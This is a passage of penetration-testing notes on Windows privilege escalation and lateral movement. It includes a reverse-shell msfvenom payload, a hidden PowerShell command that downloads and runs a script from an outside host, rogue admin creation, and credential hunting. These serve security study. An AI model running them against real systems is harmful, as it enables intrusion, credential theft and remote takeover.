Get-WmiObject -Class win32_service | f` *
```

When service path is unquoted:
```
C:\PROGRAM FILES\SUB DIR\PROGRAM NAME
```

Areas we can place files for exploit are marked with *
```
C:\PROGRAM*FILES\SUB*DIR\PROGRAM*NAME
```

Examples:
```
c:\program.exe files\sub dir\program name
c:\program files\sub.exe dir\program name
c:\program files\sub dir\program.exe name
```

## Service binary in a location writable to current user

Replace the binary to gain code execution.

```
Get-ModifiableServiceFile -Verbose
```

## Service can be modified by current user

```
Get-ModifiableService -Verbose
```

# DLL Hijacking
# Token Impersonation

PowerSploit / Incognito

List all tokens
```
Invoke-TokenManipulation -ShowAll
```

List all unique and usable tokens
```
Invoke-TokenManipulation -Enumerate
```

Start new process with token of a user
```
Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"
```

Start new process with token of another process
```
Invoke-TokenManipulation -CreateProcess "C:\Windown\system32\WindowsPowerShell\v1.0\PowerShell.exe" -ProcessId 500
```

# Technniques

## Service Unquoted Path

- `exploit/windows/local/trusted_service_path`

```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```
```
C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe

Leads to running:
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\Program.exe
C:\Program Files (x86)\Program Folder\A.exe
C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
```

Insecure Setup:
```
C:\Windows\System32>sc create "Vulnerable Service" binPath= "C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe" start=auto
C:\Windows\System32>cd C:\Program Files (x86)
C:\Program Files (x86)>mkdir "Program Folder\A Subfolder"
C:\Program Files (x86)>icacls "C:\Program Files (x86)\Program Folder" /grant Everyone:(OI)(CI)F /T
```
## Folder & Service Executable Privileges

- When new folders are created in the root it is writeable for all authenticated users by default. (NT AUTHORITY\Authenticated Users:(I)(M))
- So any application that gets installed on the root can be tampered with by a non-admin user.
    - If binaries load with SYSTEM privileges from this folder it might just be a matter of replacing the binary with your own one.
- https://msdn.microsoft.com/en-us/library/bb727008.aspx

If folder is writable, drop a exe and use "Service Unquoted Path" to execute:
```
icacls "C:\Program Files (x86)\Program Folder"
```

If service exe is writable to everyone, low privilege user can replace the exe with some other binary:
```
icacls example.exe
```

```
F = Full Control
CI = Container Inherit - This flag indicates that subordinate containers will inherit this ACE.
OI = Object Inherit - This flag indicates that subordinate files will inherit the ACE.
```

## Service Permissions

- `exploit/windows/local/service_permissions`

### Approach 1 - Check permissions of service
```
subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
```
If service is editable, change the `ImagePath` to another exe.
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f
```

or create a local admin with:
```
sc config "Vulnerable Service" binpath="net user eviladmin P4ssw0rd@ /add
sc config "Vulnerable Service" binpath="net localgroup Administrators eviladmin /add"
```

### Approach 2 - Check services a given user can edit
```
accesschk.exe -uwcqv "testuser" *
```

## AlwaysInstallElevated
- `exploit/windows/local/always_install_elevated`

```
[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]
"AlwaysInstallElevated"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]
"AlwaysInstallElevated"=dword:00000001
```
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Installing MSI:
```
msiexec /quiet /qn /i malicious.msi
```

Payload Generation:
```
msfvenom -f msi-nouac -p windows/adduser USER=eviladmin PASS=P4ssw0rd@ -o add_user.msi
```
```
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe
msfvenom -f msi-nouac -p windows/exec cmd="C:\Users\testuser\AppData\Local\Temp\Payload.exe" > malicious.msi
```

## Task Scheduler
- On Windows 2000, XP, and 2003 machines, scheduled tasks run as SYSTEM privileges.
- Works only on  Windows 2000, XP, or 2003
- Must have local administrator

```
> net start "Task Scheduler"
> time
> at 06:42 /interactive "C:\Documents and Settings\test\Local Settings\Temp\Payload.exe"
```

## DLL Hijacking (DLL preloading attack or a binary planting attack)
- https://msdn.microsoft.com/en-us/library/windows/desktop/ff919712(v=vs.85).aspx
- Search order: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx

```
When an application dynamically loads a dynamic-link library without specifying a fully qualified path name, Windows attempts to locate the DLL by searching a well-defined set of directories in a particular order, as described in Dynamic-Link Library Search Order.

The directory from which the application loaded.
The system directory.
The 16-bit system directory.
The Windows directory.
The current directory.
The directories that are listed in the PATH environment variable.
```

- Services running under SYSTEM does not search through user path environment.

Identify processes / services
- Use procman (https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx).
    - Filter `Result` = `NAME NOT FOUND` and `Path` ends with `dll`
- Look at the registry key `ServiceDll` of services (`Parameters`).

### Windows 7
```
IKE and AuthIP IPsec Keying Modules (IKEEXT) – wlbsctrl.dll
Windows Media Center Receiver Service (ehRecvr) – ehETW.dll
Windows Media Center Scheduler Service (ehSched) – ehETW.dll
```

Can run Media Center services over command line:
```
schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\mcupdate”
schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\MediaCenterRecoveryTask”
schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\ActivateWindowsSearch”
```

### Windows XP
```
Automatic Updates (wuauserv) – ifsproxy.dll
Remote Desktop Help Session Manager (RDSessMgr) – SalemHook.dll
Remote Access Connection Manager (RasMan) – ipbootp.dll
Windows Management Instrumentation (winmgmt) – wbemcore.dll
```
```
Audio Service (STacSV) – SFFXComm.dll SFCOM.DLL
Intel(R) Rapid Storage Technology (IAStorDataMgrSvc) – DriverSim.dll
Juniper Unified Network Service(JuniperAccessService) – dsLogService.dll
Encase Enterprise Agent – SDDisk.dll
```

### Migrations

#### CWDIllegalInDllSearch
- Allow user to change DLL search path algorithm

```
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]
    CWDIllegalInDllSearch
```
1, 2 or ffffffff ?

```
The directory from which the application loaded
32-bit System directory (C:\Windows\System32)
16-bit System directory (C:\Windows\System)
Windows directory (C:\Windows)
[ dlls not loaded ] The current working directory (CWD)            
Directories in the PATH environment variable (system then user)
```
#### SetDllDirectory
- Removes the current working directory (CWD) from the search order

SetDllDirectory(“C:\\program files\\MyApp\\”) :
```
The directory from which the application loaded
[ added ] C:\program files\MyApp\                                    
32-bit System directory (C:\Windows\System32)
16-bit System directory (C:\Windows\System)
Windows directory (C:\Windows)
[ removed ] The current working directory (CWD)             
Directories in the PATH environment variable (system then user)
```

SetDllDirectory("")
```
The directory from which the application loaded
32-bit System directory (C:\Windows\System32)
16-bit System directory (C:\Windows\System)
Windows directory (C:\Windows)
[ removed ] The current working directory (CWD)
Directories in the PATH environment variable (system then user)
```

#### SafeDllSearchMode
- Enabled by default
- Can disable using `[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]`
- Calling the SetDllDirectory(“”) or SetDllDirectory(“C:\\program files\\MyApp\\”) disables SafeDllSearchMode and uses the search order described for SetDllDirectory.

#### DEV
- LoadLibraryEx (additional argument)
- SetEnvironmentVariable(TEXT(“PATH”),NULL)
- Change default installation folder to C:\Program Files
- Fully qualified path when loading DLLs
- Use SetDllDirectory(“”) API removing the current working directory from the search order
- If software needs to be installed on the root check there are no binaries needing SYSTEM privileges
- If SYSTEM privileges are required then change the ACL’s of the folder
- Remove the path entry from the SYSTEM path variable if not needed

When enabled
```
The directory from which the application loaded
32-bit System directory (C:\Windows\System32)
16-bit System directory (C:\Windows\System)
Windows directory (C:\Windows)
The current working directory (CWD)           
Directories in the PATH environment variable (system then user)
```

When disabled
```
The directory from which the application loaded
[ moved up the list ] The current working directory (CWD)                   
32-bit System directory (C:\Windows\System32)
16-bit System directory (C:\Windows\System)
Windows directory (C:\Windows)   
Directories in the PATH environment variable (system then user)
```

## Stored Credentials
```
C:\unattend.xml
C:\sysprep.inf
C:\sysprep\sysprep.xml
```

```
dir c:\*vnc.ini /s /b /c
dir c:\*ultravnc.ini /s /b /c
dir c:\ /s /b /c | findstr /si *vnc.ini
findstr /si password *.txt | *.xml | *.ini
findstr /si pass *.txt | *.xml | *.ini
```

## Unattended Installations
- `post/windows/gather/enum_unattend`
- Look for `UserAccounts` tag of `Unattend.xml`, `sysprep.xml` and `sysprep.inf` across the system, including:
```
C:\Windows\Panther\
C:\Windows\Panther\Unattend\
C:\Windows\System32\
C:\Windows\System32\sysprep\
```
- Microsoft appends "Password" to all passwords within Unattend files before encoding them.

## Group Policy Preferences (GPP)
- `GPP` allows for configuration of Domain-attached machines via `group policy`.
- Domain machines periodically reach out and authenticate to the Domain Controller utilizing the Domain credentials of the `logged-in user` and pull down policies.
- Group Policies for account management are stored on the Domain Controller in `Groups.xml` files buried in the `SYSVOL` folder
- `cpassword` is used to set passwords for the Local Administrator account.
- Password is AES encrypted (https://msdn.microsoft.com/en-us/library/Cc422924.aspx)

- Metasploit: `post/windows/gather/credentials/gpp`
- PowerSploit: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1

```
Get-GPPPassword
Get-NetOU -GUID "{4C86DD57-4040-41CD-B163-58F208A26623}" | %{ Get-NetComputer -ADSPath $_ }
// All OUs connected to policy | List all domain machines tied to OU
```

- Future - Local Administrator Password Solution (LAPS): https://www.microsoft.com/en-us/download/details.aspx?id=46899

## Using Kernel Exploit
Installed updates:
```
wmic qfe get Caption,Description,HotFixID,InstalledOn

```

KiTrap0d
# Important Payloads
- `MS11-080` AfdJoinLeaf xp 2003 both 32 and 64 / MS12-042

```
python py installer module
python pyinsaller.py --onefile example.py
```

# Unrelated Notes

## Services
- Registry entries: `HKLM\SYSTEM\CurrentControlSet\Services`
- View service properties: `sc qc "Vulnerable Service"`
- Restarting: `sc stop "Vulnerable Service"`
- Restart PC: `shutdown /r /t 0`
- Change binary path: `sc config "Vulnerable Service" binpath= "net user eviladmin P4ssw0rd@ /add`

## MSI
- Installing MSI: `msiexec /quiet /qn /i malicious.msi`
```
/quiet = Suppress any messages to the user during installation
/qn = No GUI
/i = Regular (vs. administrative) installation
```


## Keep alive
When a service starts in Windows operating systems, it must communicate with the `Service Control Manager`. If it’s not, `Service Control Manager` will terminates the process.

# Using Credentials

## Password Spraying
- `auxiliary/scanner/smb/smb_login`
- Send the same credentials to all hosts listening on 445
    - `msf auxiliary(smb_login) > services -p 445 -R`
- Can do same with `CrackMapExec` for a subnet: https://github.com/byt3bl33d3r/CrackMapExec
- Can use following command to explore:
```
net use \\machine-name /user:username@domainname passwords
dir \\machine-name\c$
net use
```
- Can be detected by using `net session`
- Can terminate all session with `net use /delete *`
- Some commands, such as `net view` use the login user-name. .: use `runas`
```
runas /netonly /user:user@domainname "cmd.exe"
net view \\machine-name /all
```
- Verify it uses Kerberos by `klist`

## Get shells
### psexec
- `auxiliary/admin/smb/psexec`
- `auxiliary/admin/smb/psexec_comman`
- psexec.py - https://github.com/CoreSecurity/impacket

```
PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software
```
```
PsExec.exe \\machinename -u user@domainname -p password cmd.exe
```
- `-s` to get `SYSTEM` shell
- Use runas to use Kerberos TGT and avoid giving password:
```
runas /netonly /user:user@domainname PsExec.exe \\machinename -u user@domainname  cmd.exe
```

Manual Operation
- Copy a binary to the ADMIN$ share over SMB (`C:\Windows\PSEXECSVC.exe.`)
    - `copy example.exe \\machine\ADMIN$`
- Create a service on the remote matching pointing to the binary
    - `sc \\machine create serviceName binPath="c:\Windows\example.exe"`
- Remotely start the service
    - `sc \\machine start serviceName`
- When exited, stop the service and delete the binary
    - `del \\machine\ADMIN$\example.exe`

### smbexec.pp
- Stealthier (does not drop a binary)
- Creates a service
- Service File Name contains a command string to execute (%COMSPEC% points to the absolute path of cmd.exe)
- Echos the command to be executed to a bat file, redirects the stdout and stderr to a Temp file, then executes the bat file and deletes it.
- Creates a log entry for each command.
-
```
Use Metasploit web_delivery to send script

sc \\machine create serviceName binPath="powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');"
sc \\machine start serviceName
```

### Winexe
- https://sourceforge.net/projects/winexe/

### wmiexec.py
- Windows Management Instrumentation (WMI) to launch a semi-interactive shell.
- WMI is the infrastructure for management data and operations on Windows (like SNMP).
```
wmic computerystem list full /format:list  
wmic process list /format:list  
wmic ntdomain list /format:list  
wmic useraccount list /format:list  
wmic group list /format:list  
wmic sysaccount list /format:list  
```
- https://techcommunity.microsoft.com/t5/Ask-The-Performance-Team/Useful-WMIC-Queries/ba-p/375023
- https://windowstech.net/wmic-commands/
- Can query remotely.
- Logging for WMI events is disabled by default: https://msdn.microsoft.com/en-us/library/windows/desktop/aa826686(v=vs.85).aspx
```
wmic
wmic> /node:"machinename" /user:"username" computerystem list full /format:list
```
- Local admins on a remote machine
```
wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")  
```
- Who is logged-in: `wmic /node:ordws01 path win32_loggedonuser get antecedent`
- Read nodes from text file: `wmic /node:@workstations.txt path win32_loggedonuser get antecedent  `
- Execute command:
```
powershell.exe -NoP -sta -NonI -W Hidden -Enc JABXAEMAPQBOAEUAVwAtAE8AQgBKAGUAQw...truncated...  
```
```
wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"  
```
- Used in:
    - https://github.com/samratashok/nishang
    - https://github.com/PowerShellMafia/PowerSploit
    - CrackMapExec
    - wmiexec.py
    - wmis

### Windows Remote Management (WinRM)
- 5985/tcp (HTTP) / 5986/tcp (HTTPS)
- Allows remote management of Windows machines over HTTP(S) using SOAP.
- On the backend it's utilizing WMI.
- Enable: `Enable-PSRemoting -Force Set-Item wsman:\localhost\client\trustedhosts *`
- Test if target is configured for WinRM: `Test-WSMan machinename`
- Execute command: `Invoke-Command -Computer ordws01 -ScriptBlock {ipconfig /all} -credential CSCOU\jarrieta  `
    - Command line: `Enter-PSSession -Computer ordws01 -credential CSCOU\jarrieta `
- Force enabling WinRM:
```
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\ordws04 -u cscou\jarrieta -p nastyCutt3r -h -d powershell.exe "enable-psremoting -force"  
```

### CrackMapExec
- "-x" parameter to send commands.
- wmiexec.py across multiple IPs

### Using Remote Desktop
- Impacket's rdp_check to see if you have RDP access,
- Then use Kali's rdesktop to connect:
